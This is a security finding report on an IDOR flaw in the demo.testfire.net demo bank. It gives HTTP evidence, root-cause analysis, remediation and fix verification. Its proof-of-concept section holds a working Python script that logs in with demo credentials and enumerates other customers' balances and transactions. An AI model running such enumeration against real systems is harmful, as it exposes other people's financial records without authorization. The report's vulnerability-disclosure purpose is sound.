# IDOR / Broken Object-Level Authorization exposes any customer's balance and transaction history

**ID:** vuln-0004
**Severity:** MEDIUM
**Found:** 2026-09-20 21:46:15 UTC
**Target:** http://demo.testfire.net
**Endpoint:** /api/account/{accountNo}
**Method:** GET
**CWE:** CWE-639
**CVSS:** 6.5
**Confidence:** High
**Fix Effort:** Low

## Description

The account REST endpoints (`/api/account/{accountNo}` and `/api/account/{accountNo}/transactions`) and the web account-history view (`/bank/showAccount`, `/bank/balance.jsp`) fetch an account purely from the caller-supplied account number without verifying that the account belongs to the authenticated user. Any authenticated low-privilege user can read the balance and transaction history of arbitrary accounts, disclosing other customers' financial records.

## Evidence

Authentication as `jsmith` (lowest privilege) and the caller's own account list:

```text

GET  /api/account -> 200
{"Accounts":[{"Name":"Savings","id":"800002"},{"Name":"Checking","id":"800003"},
{"Name":"Credit Card","id":"4539082039396288"},{"Name":"Checking","id":"800011"},
{"Name":"Checking","id":"800013"} ... {"Name":"Checking","id":"800023"}]}
```

Retrieving accounts that are absent from that list, with the same token:

Transactions endpoint exposes per-account history the caller does not own:

```text

  {"date":"2026-07-09","transaction_type":"Deposit","ammount":"$1.00"}, ...]}
```

Negative control — accounts that do not exist return no data, proving the foreign results are real account records and not a generic template:

```text
GET /api/account/800026  -> 500 {Error : null
GET /api/account/800999  -> 500 {Error : null
GET /api/account/800999/transactions -> 200 {"Error":null}
```

Web surface (authenticated `jsmith` session via `POST /doLogin`) renders other customers' account history:

```text
GET /bank/showAccount?listAccounts=800000 -> 200  80836 bytes  title "Account History - 800000"
GET /bank/showAccount?listAccounts=800001 -> 200  80801 bytes  title "Account History - 800001"
GET /bank/balance.jsp?acctId=800000       -> 200  80933 bytes  title "Account History - 800000"
GET /bank/showAccount?listAccounts=800999 -> 500  (negative control)
```

Root cause visible in source (line 63 of the API resource): `// not checking the account number, side privilege escalation possible`, followed by `Account.getAccount(accountNo).getBalance()` with no ownership test.

## Impact

An authenticated attacker can enumerate the account-number space and read the balance, credit/debit history and last-10-transactions of accounts that are not their own. Using the lowest-privilege account (`jsmith`), 12 accounts outside the caller's own account list were retrieved in a single pass over a contiguous numeric range, so the entire account population is reachable by an authenticated user. This is horizontal privilege escalation with broad unauthorized disclosure of other customers' financial data.

## Counterevidence

The target is an intentionally-vulnerable public demo application with synthetic account data, which caps real-world business impact. That does not neutralise the finding: the application itself models per-user account ownership — `GET /api/account`, the `AltoroAccounts` cookie, and `main.jsp` all list only the caller's accounts — so the object-level endpoints genuinely cross an authorization boundary rather than exposing an intentionally public data surface, and the missing check is confirmed in source. Checked for a control that would rule the finding out: there is none on the GET paths (the POST transactions path is scoped via `user.lookupAccount` and correctly returns no data). A negative control (non-existent accounts 800026-800030 and 800999) returned empty/error bodies while foreign accounts returned distinct balances and transaction sets, confirming the leaked data are real, distinct account records. No WAF or rate limiting was observed on the endpoint. Note that the account `4539082039396288` is present in jsmith's own account list and was therefore excluded from the cross-account claim.

## What Would Change This Severity

Confirmation that the deployment is a strictly isolated demo instance with no real customer data and is treated purely as a training artifact would reduce this to a low/informational demonstration issue; confirmation that the account space maps to many distinct real customers would keep confidentiality at High.

## Technical Analysis

The application models per-user account ownership: `GET /api/account` returns only the caller's accounts, the `AltoroAccounts` client cookie lists only the caller's accounts, and `main.jsp` renders only the caller's accounts. The object-level endpoints, however, look up an account by the raw path/query parameter and never re-check ownership.

In `AccountAPI.getAccountBalance` (`GET /api/account/{accountNo}`) the account is fetched with `Account.getAccount(accountNo)` — the source even carries the comment `// not checking the account number, side privilege escalation possible` — and the response then includes the balance plus `credits`, `debits` and `last_10_transactions`. `AccountAPI.showLastTenTransactions` (`GET /api/account/{accountNo}/transactions`) likewise calls `getLastTenTransactions(accountNo)` directly. Only the `POST` variant uses `user.lookupAccount(...)`, which is why it correctly returns no data for foreign accounts.

The web path has the same defect: `AccountViewServlet.doGet` forwards `listAccounts` straight to `/bank/balance.jsp?acctId=<value>`, and `balance.jsp` calls `Account.getAccount(paramName).getBalance()` without checking that `paramName` is among `user.getAccounts()`. The page renders the foreign account's balance and transaction list.

The correct control already exists in the codebase — `User.lookupAccount(Long)` returns `null` when the account is not the caller's (used by the POST path). The fix applies that same check before any account data is read.

## Proof of Concept

1. Log in as the low-privilege user `jsmith` via `POST /api/login` and capture the Bearer token.
2. Call `GET /api/account` to obtain the authoritative list of accounts the application attributes to the caller.
3. Request a range of account numbers with `GET /api/account/{accountNo}` using the same token; any account not in the list is another customer's.
4. Observe that foreign accounts return HTTP 200 with `balance`, `credits`, `debits` and `last_10_transactions`, whereas a non-existent account returns an empty/error body (negative control).
5. Repeat with `GET /api/account/{accountNo}/transactions` and, using the web session (`POST /doLogin`), with `GET /bank/showAccount?listAccounts={accountNo}` to confirm the same exposure on all surfaces.

```python
import requests

BASE = "http://demo.testfire.net"
USER, PASS = "jsmith", "demo1234"

s = requests.Session()
tok = s.post(f"{BASE}/api/login",
             json={"username": USER, "password": PASS}).json()["Authorization"]
H = {"Authorization": f"Bearer {tok}"}

# Accounts the application attributes to the authenticated user
own = [a["id"] for a in s.get(f"{BASE}/api/account", headers=H).json()["Accounts"]]
print("caller's own accounts:", own)

# Any account NOT in that list belongs to another customer
for n in range(800000, 800026):
    r = s.get(f"{BASE}/api/account/{n}", headers=H)
    tag = "OWN" if str(n) in own else "FOREIGN"
    j = r.json() if r.status_code == 200 else {}
    print(f"/api/account/{n} [{tag}] HTTP {r.status_code} "
          f"balance={j.get('balance')} "
          f"tx={len(j.get('last_10_transactions', []))}")

# Same flaw on the transactions endpoint and the web account-history page
w = requests.Session()
w.post(f"{BASE}/doLogin", data={"uid": USER, "passw": PASS})
for n in (800000, 800001, 800012):
    tx = s.get(f"{BASE}/api/account/{n}/transactions", headers=H)
    page = w.get(f"{BASE}/bank/showAccount?listAccounts={n}")
    print(f"/api/account/{n}/transactions -> {tx.text[:90]}")
    print(f"/bank/showAccount?listAccounts={n} HTTP {page.status_code} "
          f"foreign_history_rendered={'Account History - %d' % n in page.text}")
```

## Remediation

Bind every account lookup to the authenticated caller before any account data is read. For the REST resource, resolve the caller via the authenticated request context and reject the request when the requested account number is not among the caller's accounts — the existing helper `User.lookupAccount(Long)` already returns `null` for accounts that do not belong to the user and should be used as the gate, returning HTTP 403 (or 404 to avoid leaking account existence). Apply the same check to every endpoint that takes an account identifier, including the last-10-transactions route. On the web side, validate the account identifier against the session user's accounts in the account-history view and redirect to the account summary when it is not owned. Prefer a single reusable authorization helper over per-handler checks so new endpoints inherit the control, and add regression tests that assert a foreign account number yields no data on each route.

## Fix Verification

Security closure: the patched `getAccountBalance` and `showLastTenTransactions` resolve the caller with `OperationsUtil.getUser(request)` and gate on `user.lookupAccount(Long.parseLong(accountNo))` before any account data is read; for a foreign account this returns `null`, so the handler responds 403 and never reaches `Account.getAccount(...)`/`getLastTenTransactions(...)`. The web view sets `accountOwned` only when the requested id appears in `user.getAccounts()` and redirects otherwise. This mirrors the existing control already used by the POST transactions path, which was confirmed live to return no data for foreign accounts.

Bypass review: I checked the sibling account-reading routes — `GET /api/account/{accountNo}`, `GET /api/account/{accountNo}/transactions`, and the web `balance.jsp`/`showAccount` path are all addressed; `POST /api/account/{accountNo}/transactions` was already scoped and `transaction.jsp` already limits output to `user.getAccounts()`. Null/empty `acctId` (now redirects instead of erroring) and the long-valued credit-card account number were considered; `Long.parseLong` handles the latter.

Preserved behaviour: access to the caller's own accounts is unchanged (the ownership test passes for owned accounts), the account selector dropdown still renders, and legitimate redirects still resolve to the account summary.

Repository checks: NOT EXECUTED. No JDK or build toolchain is available and the application's third-party dependencies are not vendored, so the patched sources could not be compiled or the running app re-tested here. Security closure and bypass review above are static re-traces; this is the outstanding gap.
